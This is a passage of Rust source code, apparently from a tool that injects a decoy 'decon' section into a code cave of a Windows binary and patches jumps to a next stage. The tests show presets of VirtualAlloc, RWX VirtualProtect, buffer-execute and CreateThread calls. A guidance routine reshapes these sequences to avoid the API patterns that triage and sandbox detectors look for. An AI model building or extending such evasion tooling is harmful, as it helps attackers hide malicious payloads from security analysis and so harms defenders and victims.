    section.extend_from_slice(decon_code);

    // 2. Sequence table
    let table_start_offset = section.len();
    section.extend_from_slice(sequence_table);

    let next_stage_offset = section.len();

    // --- Patch sentinel displacements ---

    // Data LEA: RIP-relative to sequence_table start
    {
        let rip_after = decon_layout.data_lea_disp_offset + 4;
        let disp = table_start_offset as i32 - rip_after as i32;
        section[decon_layout.data_lea_disp_offset..decon_layout.data_lea_disp_offset + 4]
            .copy_from_slice(&disp.to_le_bytes());
    }

    // JMP: RIP-relative to next_stage (right after sequence table)
    {
        let rip_after = decon_layout.next_jmp_disp_offset + 4;
        let disp = next_stage_offset as i32 - rip_after as i32;
        section[decon_layout.next_jmp_disp_offset..decon_layout.next_jmp_disp_offset + 4]
            .copy_from_slice(&disp.to_le_bytes());
    }

    (section, next_stage_offset)
}

/// Estimate overhead of decon section for code cave sizing.
pub fn decon_overhead_estimate(decon_code_size: usize, spec: &DeconSpec) -> usize {
    decon_code_size + spec.serialized_size()
}

// =============================================================================
// Tests
// =============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_serialize_deserialize_roundtrip() {
        let spec = DeconPreset::AllocLoop.to_spec(20);
        let bytes = spec.serialize();
        let spec2 = DeconSpec::deserialize(&bytes).unwrap();

        assert_eq!(spec2.round_count, 20);
        assert_eq!(spec2.steps.len(), spec.steps.len());
        assert_eq!(spec2.strings.len(), spec.strings.len());
        assert_eq!(spec2.seed, spec.seed);
        assert_eq!(spec2.flags, spec.flags);

        for (a, b) in spec.steps.iter().zip(spec2.steps.iter()) {
            assert_eq!(a.opcode, b.opcode);
            assert_eq!(a.flags, b.flags);
            assert_eq!(a.param_a, b.param_a);
            assert_eq!(a.param_b, b.param_b);
            assert_eq!(a.param_c, b.param_c);
            assert_eq!(a.ext, b.ext);
        }

        for (a, b) in spec.strings.iter().zip(spec2.strings.iter()) {
            assert_eq!(a, b);
        }
    }

    #[test]
    fn test_roundtrip_all_presets() {
        for preset in [
            DeconPreset::AllocLoop,
            DeconPreset::AllocExec,
            DeconPreset::MixedApis,
            DeconPreset::EntropyFlood,
            DeconPreset::ThreadAlloc,
        ] {
            let spec = preset.to_spec(15);
            let bytes = spec.serialize();
            let spec2 = DeconSpec::deserialize(&bytes).unwrap();
            assert_eq!(spec2.round_count, 15, "preset {:?}", preset);
            assert_eq!(spec2.steps.len(), spec.steps.len(), "preset {:?}", preset);
        }
    }

    #[test]
    fn test_alloc_loop_steps() {
        let spec = DeconPreset::AllocLoop.to_spec(20);
        assert_eq!(spec.steps.len(), 4);
        assert_eq!(spec.steps[0].opcode, DeconOpcode::VirtualAlloc);
        assert_eq!(spec.steps[1].opcode, DeconOpcode::MemsetFill);
        assert_eq!(spec.steps[2].opcode, DeconOpcode::VirtualProtect);
        assert_eq!(spec.steps[3].opcode, DeconOpcode::VirtualFree);
    }

    #[test]
    fn test_alloc_exec_steps() {
        let spec = DeconPreset::AllocExec.to_spec(20);
        assert_eq!(spec.steps.len(), 5);
        assert_eq!(spec.steps[0].opcode, DeconOpcode::VirtualAlloc);
        assert_eq!(spec.steps[1].opcode, DeconOpcode::MemsetFill);
        assert_eq!(spec.steps[2].opcode, DeconOpcode::VirtualProtect);
        assert_eq!(spec.steps[3].opcode, DeconOpcode::CallBuf);
        assert_eq!(spec.steps[4].opcode, DeconOpcode::VirtualFree);
    }

    #[test]
    fn test_mixed_apis_steps() {
        let spec = DeconPreset::MixedApis.to_spec(15);
        assert_eq!(spec.steps.len(), 7);
        assert_eq!(spec.steps[0].opcode, DeconOpcode::VirtualAlloc);
        assert_eq!(spec.steps[1].opcode, DeconOpcode::CreateFileRead);
        assert_eq!(spec.steps[2].opcode, DeconOpcode::MemsetFill);
        assert_eq!(spec.steps[3].opcode, DeconOpcode::RegQuery);
        assert_eq!(spec.steps[4].opcode, DeconOpcode::VirtualProtect);
        assert_eq!(spec.steps[5].opcode, DeconOpcode::GetEnvVar);
        assert_eq!(spec.steps[6].opcode, DeconOpcode::VirtualFree);
    }

    #[test]
    fn test_entropy_flood_steps() {
        let spec = DeconPreset::EntropyFlood.to_spec(20);
        assert_eq!(spec.steps.len(), 4);
        assert_eq!(spec.steps[0].opcode, DeconOpcode::VirtualAlloc);
        assert_eq!(spec.steps[1].opcode, DeconOpcode::EntropyFill);
        assert_eq!(spec.steps[2].opcode, DeconOpcode::VirtualProtect);
        assert_eq!(spec.steps[3].opcode, DeconOpcode::VirtualFree);
    }

    #[test]
    fn test_thread_alloc_steps() {
        let spec = DeconPreset::ThreadAlloc.to_spec(15);
        assert_eq!(spec.steps.len(), 5);
        assert_eq!(spec.steps[3].opcode, DeconOpcode::CreateThread);
        assert_eq!(spec.steps[3].param_a, 5000); // timeout
    }

    #[test]
    fn test_header_magic_and_version() {
        let spec = DeconPreset::AllocLoop.to_spec(10);
        let bytes = spec.serialize();
        assert_eq!(u16::from_le_bytes([bytes[0], bytes[1]]), DECON_MAGIC);
        assert_eq!(bytes[2], DECON_VERSION);
    }

    #[test]
    fn test_serialized_size_matches() {
        let spec = DeconPreset::MixedApis.to_spec(15);
        let bytes = spec.serialize();
        assert_eq!(bytes.len(), spec.serialized_size());
    }

    #[test]
    fn test_extended_step_roundtrip() {
        let mut spec = DeconSpec::new(5);
        spec.push(DeconStep {
            opcode: DeconOpcode::VirtualAlloc,
            flags: step_flags::HAS_EXT,
            param_a: 1,
            param_b: 2,
            param_c: 3,
            ext: Some([4, 5, 6, 7]),
        });
        spec.push(DeconStep::new(DeconOpcode::Nop, 0, 0, 0, 0));

        let bytes = spec.serialize();
        let spec2 = DeconSpec::deserialize(&bytes).unwrap();
        assert_eq!(spec2.steps.len(), 2);
        assert_eq!(
            spec2.steps[0].flags & step_flags::HAS_EXT,
            step_flags::HAS_EXT
        );
        assert_eq!(spec2.steps[0].ext, Some([4, 5, 6, 7]));
        assert_eq!(spec2.steps[1].ext, None);
    }

    #[test]
    fn test_add_string_dedup() {
        let mut spec = DeconSpec::new(1);
        let idx1 = spec.add_string("COMPUTERNAME");
        let idx2 = spec.add_string("COMPUTERNAME");
        let idx3 = spec.add_string("NEW_STRING");
        assert_eq!(idx1, idx2, "Duplicate strings should return same index");
        assert_ne!(idx1, idx3);
    }

    #[test]
    fn test_preset_from_str() {
        assert_eq!(
            DeconPreset::parse("alloc_loop"),
            Some(DeconPreset::AllocLoop)
        );
        assert_eq!(
            DeconPreset::parse("mixed_apis"),
            Some(DeconPreset::MixedApis)
        );
        assert_eq!(DeconPreset::parse("Mixed"), Some(DeconPreset::MixedApis));
        assert_eq!(
            DeconPreset::parse("ENTROPY_FLOOD"),
            Some(DeconPreset::EntropyFlood)
        );
        assert_eq!(DeconPreset::parse("unknown"), None);
    }

    #[test]
    fn test_deserialize_bad_magic() {
        let mut bytes = DeconPreset::AllocLoop.to_spec(10).serialize();
        bytes[0] = 0xFF;
        assert!(DeconSpec::deserialize(&bytes).is_err());
    }

    #[test]
    fn test_deserialize_truncated() {
        assert!(DeconSpec::deserialize(&[0; 8]).is_err());
    }

    #[test]
    fn test_from_guidance_inserts_noise() {
        let guidance = TriageGuidance {
            avoid_tokens: vec!["seq2:VirtualAlloc->VirtualProtect".to_string()],
            seek_tokens: vec![],
        };
        let spec = DeconSpec::from_guidance(&guidance, 10);
        // The mixed_apis base has alloc...protect with stuff between, but if
        // the bigram match fired, extra noise should be inserted.
        // At minimum, the spec should have more steps than the base MixedApis (7).
        assert!(spec.steps.len() >= 7);
    }

    #[test]
    fn test_from_guidance_modifies_protection() {
        let guidance = TriageGuidance {
            avoid_tokens: vec!["api_arg:VirtualProtect:flProtect=0x40".to_string()],
            seek_tokens: vec![],
        };
        let spec = DeconSpec::from_guidance(&guidance, 10);
        // VirtualProtect steps should use 0x40 protection
        let protect_steps: Vec<_> = spec
            .steps
            .iter()
            .filter(|s| s.opcode == DeconOpcode::VirtualProtect)
            .collect();
        assert!(!protect_steps.is_empty());
        assert_eq!(protect_steps[0].param_a, 0x40);
    }

    #[test]
    fn test_map_api_to_opcode() {
        assert_eq!(
            map_api_to_opcode("VirtualAlloc"),
            Some(DeconOpcode::VirtualAlloc)
        );
        assert_eq!(
            map_api_to_opcode("NtAllocateVirtualMemory"),
            Some(DeconOpcode::VirtualAlloc)
        );
        assert_eq!(
            map_api_to_opcode("NtProtectVirtualMemory"),
            Some(DeconOpcode::VirtualProtect)
        );
        assert_eq!(
            map_api_to_opcode("CreateThread"),
            Some(DeconOpcode::CreateThread)
        );
        assert_eq!(map_api_to_opcode("UnknownApi"), None);
    }

    #[test]
    fn test_parse_protection_value() {
        assert_eq!(parse_protection_value("0x20").unwrap(), 0x20);
        assert_eq!(parse_protection_value("0x40").unwrap(), 0x40);
        assert_eq!(parse_protection_value("RW").unwrap(), 0x04);
        assert_eq!(parse_protection_value("RWX").unwrap(), 0x40);
        assert_eq!(parse_protection_value("PAGE_EXECUTE_READ").unwrap(), 0x20);
    }

    #[test]
    fn test_decon_overhead_estimate() {
        let spec = DeconPreset::AllocLoop.to_spec(20);
        let overhead = decon_overhead_estimate(512, &spec);
        assert_eq!(overhead, 512 + spec.serialized_size());
    }

    #[test]
    fn test_string_table_default_entries() {
        let spec = DeconSpec::new(1);
        assert_eq!(spec.strings.len(), 4);
        assert_eq!(spec.strings[0], "C:\\Windows\\System32\\ntdll.dll");
        assert_eq!(spec.strings[3], "COMPUTERNAME");
    }
}
